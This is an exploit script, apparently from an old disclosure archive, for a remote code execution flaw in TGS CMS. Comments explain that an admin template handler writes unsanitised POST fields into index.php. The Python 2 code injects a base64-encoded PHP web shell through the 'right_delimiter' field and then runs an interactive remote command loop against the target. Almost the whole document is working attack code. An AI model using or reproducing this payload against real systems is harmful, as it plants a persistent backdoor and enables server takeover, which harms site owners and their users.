#			TGS CMS Remote Code Execution Exploit
#					by 0in
#				from Dark-Coders Group!
#				  www.dark-coders.pl
# Contact: 0in(dot)email[at]gmail(dot)com
# Greetings to:die_angel,suN8Hclf,m4r1usz,cOndemned,str0ke
# Dork:NULL - because "You cannot kill what you did not create" <- Duality by Slipknot
# Let's analyze the vuln:
# We've got the: /cms/admin/admin.template_engine.php 
# first line:"<?" 
# next 2-22 lines - comments
# 23: if ($_GET['option'] == "set_template") { 
# 24: $filename = "../index.php";
# 25: if ((@is_writeable($filename)) && ($handle = @fopen($filename, "w"))) {
# From 50 line to 88 we have definition of file content 
# 50: $content = '<?php // here programmer define the file to save in "../index.php"
# but...
# he.. don't think xD
# 77:$tgs_template->template_dir    = "'.$_POST['template_dir'].'"; 
# 78:$tgs_template->config_dir      = "'.$_POST['config_dir'].'"; 
# 79:$tgs_template->cms_dir		  = "'.$_POST['cms_dir'].'";
# 80:$tgs_template->left_delimiter  = "'.$_POST['left_delimiter'].'";
# 81:$tgs_template->right_delimiter = "'.$_POST['right_delimiter'].'";
# And.. boom!
# 89:	if (@fwrite($handle,$content)) {
# Just simply exploit for fun:
import httplib
import urllib
print "TGS CMS Remote Code Execution Exploit"
print "by 0in From Dark-Coders Group"
print "www.dark-coders.pl"
print 'Enter target:'
target=raw_input()
print 'Enter path:'
path=raw_input()
inject="\";error_reporting(0);eval(base64_decode(\"JGNtZD0kX0dFVFsnenVvJ107c3lzdGVtKCRjbWQpO2V4aXQ7\"));//"
exploit=httplib.HTTPConnection(target+':80')
headers={'Content-type':'application/x-www-form-urlencoded',"Accept":"text/plain"}
data=urllib.urlencode({'right_delimiter':inject})
exploit.request("POST",path+"/cms/admin/admin.template_engine.php?option=set_template",data,headers)
print exploit.getresponse().read()
while(1):
	cmd=raw_input("[shell@"+target+"]#")
	if(cmd=='exit'):
		quit()
	shell=httplib.HTTPConnection(target+':80')
	shell.request("GET",path+"/cms/index.php?zuo="+cmd)
	print shell.getresponse().read()
